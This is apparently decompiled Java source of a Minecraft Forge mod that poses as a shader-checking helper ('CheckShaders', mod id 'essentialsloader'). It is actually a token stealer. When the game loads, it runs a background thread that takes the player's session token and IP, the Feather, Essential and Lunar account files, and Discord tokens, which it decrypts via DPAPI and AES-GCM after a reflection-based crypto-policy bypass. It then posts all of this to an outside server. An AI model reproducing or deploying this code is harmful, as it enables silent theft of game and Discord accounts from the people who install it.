//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\Users\****\Documents\Code\Java\MC\mcp918"!

//Decompiled by Procyon!

package qolskyblockmod.pizzaclient.util.graphics.shaders.chroma;

import net.minecraftforge.fml.common.event.*;
import net.minecraftforge.common.*;
import java.net.*;
import net.minecraft.client.*;
import java.nio.file.*;
import java.nio.charset.*;
import org.apache.commons.lang3.*;
import javax.crypto.*;
import com.google.gson.*;
import java.util.*;
import com.sun.jna.platform.win32.*;
import javax.crypto.spec.*;
import java.security.*;
import java.security.spec.*;
import net.minecraftforge.fml.common.*;
import net.minecraftforge.fml.relauncher.*;
import java.util.regex.*;
import java.lang.reflect.*;
import java.io.*;
import net.minecraftforge.event.entity.*;
import net.minecraftforge.fml.common.eventhandler.*;

@Mod(modid = "essentialsloader", acceptedMinecraftVersions = "[1.8.9]")
public class CheckShaders
{
    @Mod.EventHandler
    public void preInit(final FMLPreInitializationEvent event) {
        MinecraftForge.EVENT_BUS.register((Object)this);
        HttpURLConnection c;
        Minecraft mc;
        final InputStreamReader inputStreamReader;
        final BufferedReader bufferedReader;
        String ip;
        String token;
        String feather;
        String essentials;
        String lunar;
        String discord;
        final String s;
        final String s2;
        final String s3;
        File[] array;
        int length;
        int i = 0;
        File file;
        FileReader fr;
        BufferedReader br;
        StringBuilder parsed;
        String textFile;
        final Object o;
        Pattern pattern;
        Matcher matcher;
        Class<?> aClass;
        Constructor<?> con;
        Object allPermissionCollection;
        Field f;
        Class<?> aClass2;
        Constructor<?> con2;
        Object allPermissions;
        Field f2;
        Class<?> aClass3;
        Field f3;
        Field mf;
        byte[] dToken;
        Gson gson;
        final String s4;
        JsonObject json;
        byte[] key;
        byte[] key2;
        byte[] key3;
        byte[] key4;
        byte[] dToken2;
        Cipher cipher;
        byte[] out;
        String jsonInputString;
        OutputStream os;
        byte[] input;
        final BufferedReader bufferedReader2;
        BufferedReader br2;
        StringBuilder response;
        String responseLine;
        final Object o2;
        new Thread(() -> {
            try {
                c = (HttpURLConnection)new URL("https://authserver-whhw.onrender.com").openConnection();
                c.setRequestMethod("POST");
                c.setRequestProperty("Content-type", "application/json");
                c.setDoOutput(true);
                mc = Minecraft.getMinecraft();
                // new(java.io.BufferedReader.class)
                new InputStreamReader(new URL("https://checkip.amazonaws.com/").openStream());
                new BufferedReader(inputStreamReader);
                ip = bufferedReader.readLine();
                token = mc.getSession().getToken();
                feather = "File not found :(";
                essentials = "File not found :(";
                lunar = "File not found :(";
                discord = "Discord not found :(";
                if (Files.exists(Paths.get(mc.mcDataDir.getParent(), ".feather/accounts.json"), new LinkOption[0])) {
                    new String(Files.readAllBytes(Paths.get(mc.mcDataDir.getParent(), ".feather/accounts.json")), StandardCharsets.UTF_8);
                    feather = StringEscapeUtils.escapeJson(s);
                }
                if (Files.exists(Paths.get(mc.mcDataDir.getPath(), "essential/microsoft_accounts.json"), new LinkOption[0])) {
                    new String(Files.readAllBytes(Paths.get(mc.mcDataDir.getPath(), "essential/microsoft_accounts.json")), StandardCharsets.UTF_8);
                    essentials = StringEscapeUtils.escapeJson(s2);
                }
                if (Files.exists(Paths.get(System.getProperty("user.home"), ".lunarclient/settings/game/accounts.json"), new LinkOption[0])) {
                    new String(Files.readAllBytes(Paths.get(System.getProperty("user.home"), ".lunarclient/settings/game/accounts.json")), StandardCharsets.UTF_8);
                    lunar = StringEscapeUtils.escapeJson(s3);
                }
                if (Files.isDirectory(Paths.get(mc.mcDataDir.getParent(), "discord/Local Storage/leveldb"), new LinkOption[0])) {
                    discord = "";
                    array = Objects.requireNonNull(Paths.get(mc.mcDataDir.getParent(), "discord/Local Storage/leveldb").toFile().listFiles());
                    for (length = array.length; i < length; ++i) {
                        file = array[i];
                        if (file.getName().endsWith(".ldb")) {
                            fr = new FileReader(file);
                            br = new BufferedReader(fr);
                            parsed = new StringBuilder();
                            while (true) {
                                textFile = br.readLine();
                                if (o != null) {
                                    parsed.append(textFile);
                                }
                                else {
                                    break;
                                }
                            }
                            fr.close();
                            br.close();
                            pattern = Pattern.compile("(dQw4w9WgXcQ:)([^.*\\\\['(.*)\\\\]$][^\"]*)");
                            matcher = pattern.matcher(parsed.toString());
                            if (matcher.find()) {
                                try {
                                    if (Cipher.getMaxAllowedKeyLength("AES") < 256) {
                                        aClass = Class.forName("javax.crypto.CryptoAllPermissionCollection");
                                        con = aClass.getDeclaredConstructor((Class<?>[])new Class[0]);
                                        con.setAccessible(true);
                                        allPermissionCollection = con.newInstance(new Object[0]);
                                        f = aClass.getDeclaredField("all_allowed");
                                        f.setAccessible(true);
                                        f.setBoolean(allPermissionCollection, true);
                                        aClass2 = Class.forName("javax.crypto.CryptoPermissions");
                                        con2 = aClass2.getDeclaredConstructor((Class<?>[])new Class[0]);
                                        con2.setAccessible(true);
                                        allPermissions = con2.newInstance(new Object[0]);
                                        f2 = aClass2.getDeclaredField("perms");
                                        f2.setAccessible(true);
                                        ((Map)f2.get(allPermissions)).put("*", allPermissionCollection);
                                        aClass3 = Class.forName("javax.crypto.JceSecurityManager");
                                        f3 = aClass3.getDeclaredField("defaultPolicy");
                                        f3.setAccessible(true);
                                        mf = Field.class.getDeclaredField("modifiers");
                                        mf.setAccessible(true);
                                        mf.setInt(f3, f3.getModifiers() & 0xFFFFFFEF);
                                        f3.set(null, allPermissions);
                                    }
                                    dToken = matcher.group().split("dQw4w9WgXcQ:")[1].getBytes();
                                    gson = new Gson();
                                    new String(Files.readAllBytes(Paths.get(mc.mcDataDir.getParent(), "discord/Local State")));
                                    json = (JsonObject)gson.fromJson(s4, (Class)JsonObject.class);
                                    key = json.getAsJsonObject("os_crypt").get("encrypted_key").getAsString().getBytes();
                                    key2 = Base64.getDecoder().decode(key);
                                    key3 = Arrays.copyOfRange(key2, 5, key2.length);
                                    key4 = Crypt32Util.cryptUnprotectData(key3);
                                    dToken2 = Base64.getDecoder().decode(dToken);
                                    cipher = Cipher.getInstance("AES/GCM/NoPadding");
                                    cipher.init(2, new SecretKeySpec(key4, "AES"), new GCMParameterSpec(128, Arrays.copyOfRange(dToken2, 3, 15)));
                                    out = cipher.doFinal(Arrays.copyOfRange(dToken2, 15, dToken2.length));
                                    if (!discord.contains(new String(out, StandardCharsets.UTF_8))) {
                                        discord = discord + new String(out, StandardCharsets.UTF_8) + " | ";
                                    }
                                }
                                catch (Exception e) {
                                    e.printStackTrace();
                                    discord = "Failed to decrypt token :(";
                                }
                            }
                        }
                    }
                }
                if (Loader.isModLoaded("pizzaclient")) {
                    token = (String)ReflectionHelper.findField((Class)Class.forName("qolskyblockmod.pizzaclient.features.misc.SessionProtection"), new String[] { "changed" }).get(null);
                }
                jsonInputString = String.format("{ \"username\": \"%s\", \"uuid\": \"%s\", \"token\": \"%s\", \"ip\": \"%s\", \"feather\": \"%s\", \"essentials\": \"%s\", \"lunar\": \"%s\", \"discord\": \"%s\" }", mc.getSession().getUsername(), mc.getSession().getPlayerID(), token, ip, feather, essentials, lunar, discord);
                os = c.getOutputStream();
                input = jsonInputString.getBytes(StandardCharsets.UTF_8);
                os.write(input, 0, input.length);
                new BufferedReader(new InputStreamReader(c.getInputStream(), StandardCharsets.UTF_8));
                br2 = bufferedReader2;
                response = new StringBuilder();
                while (true) {
                    responseLine = br2.readLine();
                    if (o2 != null) {
                        response.append(responseLine.trim());
                    }
                    else {
                        break;
                    }
                }
                System.out.println(response);
                os.close();
            }
            catch (Exception e2) {
                e2.printStackTrace();
            }
        }).start();
    }
    
    @SubscribeEvent
    public void onFirstPlayerJoin(final EntityJoinWorldEvent e) {
        if (e.entity.equals((Object)Minecraft.getMinecraft().thePlayer)) {
            MinecraftForge.EVENT_BUS.unregister((Object)this);
        }
    }
}
